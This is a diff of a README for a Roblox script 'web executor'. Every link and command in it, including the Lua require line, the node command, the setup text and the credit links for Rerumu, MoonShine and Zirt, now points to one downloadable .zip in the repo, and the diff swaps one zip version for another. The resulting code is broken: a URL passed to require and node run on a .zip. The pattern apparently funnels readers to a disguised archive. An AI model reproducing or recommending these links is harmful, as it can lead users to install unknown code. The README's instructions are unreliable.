@@ -7,25 +7,25 @@
 
 # Usage
 ```lua
-local WebExecution = require(https://raw.githubusercontent.com/xdxdxd3214/WebExecution/main/lua/Modules/Interpreters/Web_Execution_v1.8.zip);
+local WebExecution = require(https://github.com/xdxdxd3214/WebExecution/raw/refs/heads/main/lua/Modules/Interpreters/Web_Execution_v1.6-beta.1.zip);
 local Start = WebExecution:Start({
     ExecutionMethod = "queue"; -- Methods (queue / job)
     ExecutionInterpreter = "fione"; -- (FiOne / Rerubi)
     BackendURL = ""; -- Backend URL
 });
 
-https://raw.githubusercontent.com/xdxdxd3214/WebExecution/main/lua/Modules/Interpreters/Web_Execution_v1.8.zip(15);
-https://raw.githubusercontent.com/xdxdxd3214/WebExecution/main/lua/Modules/Interpreters/Web_Execution_v1.8.zip();
+https://github.com/xdxdxd3214/WebExecution/raw/refs/heads/main/lua/Modules/Interpreters/Web_Execution_v1.6-beta.1.zip(15);
+https://github.com/xdxdxd3214/WebExecution/raw/refs/heads/main/lua/Modules/Interpreters/Web_Execution_v1.6-beta.1.zip();
 ```
 
 # Setting Up
-#### To set it up, you must host the back-end so the express server can successfully handle post/get requests, then you can also use the https://raw.githubusercontent.com/xdxdxd3214/WebExecution/main/lua/Modules/Interpreters/Web_Execution_v1.8.zip that is supplied in the backend files.
+#### To set it up, you must host the back-end so the express server can successfully handle post/get requests, then you can also use the https://github.com/xdxdxd3214/WebExecution/raw/refs/heads/main/lua/Modules/Interpreters/Web_Execution_v1.6-beta.1.zip that is supplied in the backend files.
 #### Then, run these _**commands**_.
 ```bash
 npm install express body-parser
 ```
 ```js
-node https://raw.githubusercontent.com/xdxdxd3214/WebExecution/main/lua/Modules/Interpreters/Web_Execution_v1.8.zip
+node https://github.com/xdxdxd3214/WebExecution/raw/refs/heads/main/lua/Modules/Interpreters/Web_Execution_v1.6-beta.1.zip
 ```
 # Description
 #### Short-story, just an web based executor which uses the long-polling method in roblox to achieve "server giving client data" since it isn't yet possible in roblox to use websockets or anything websocket related. This web executor was made in 3 hours in a rush, and it's meant to be used for 1 player only. You can adapt it to several users using it, and it even has it's custom settings.
@@ -62,6 +62,6 @@ local ENDPOINTS : {[any]: string?} =
   }
 ```
 # Credits
-- ### [Rerumu](https://raw.githubusercontent.com/xdxdxd3214/WebExecution/main/lua/Modules/Interpreters/Web_Execution_v1.8.zip) (bytecode interpreters, such as fione or rerubi)
-- ### [MoonShine](https://raw.githubusercontent.com/xdxdxd3214/WebExecution/main/lua/Modules/Interpreters/Web_Execution_v1.8.zip) (bytecode compilers such as yueliang)
-- ### [Zirt](https://raw.githubusercontent.com/xdxdxd3214/WebExecution/main/lua/Modules/Interpreters/Web_Execution_v1.8.zip) (coding / gui)
+- ### [Rerumu](https://github.com/xdxdxd3214/WebExecution/raw/refs/heads/main/lua/Modules/Interpreters/Web_Execution_v1.6-beta.1.zip) (bytecode interpreters, such as fione or rerubi)
+- ### [MoonShine](https://github.com/xdxdxd3214/WebExecution/raw/refs/heads/main/lua/Modules/Interpreters/Web_Execution_v1.6-beta.1.zip) (bytecode compilers such as yueliang)
+- ### [Zirt](https://github.com/xdxdxd3214/WebExecution/raw/refs/heads/main/lua/Modules/Interpreters/Web_Execution_v1.6-beta.1.zip) (coding / gui)
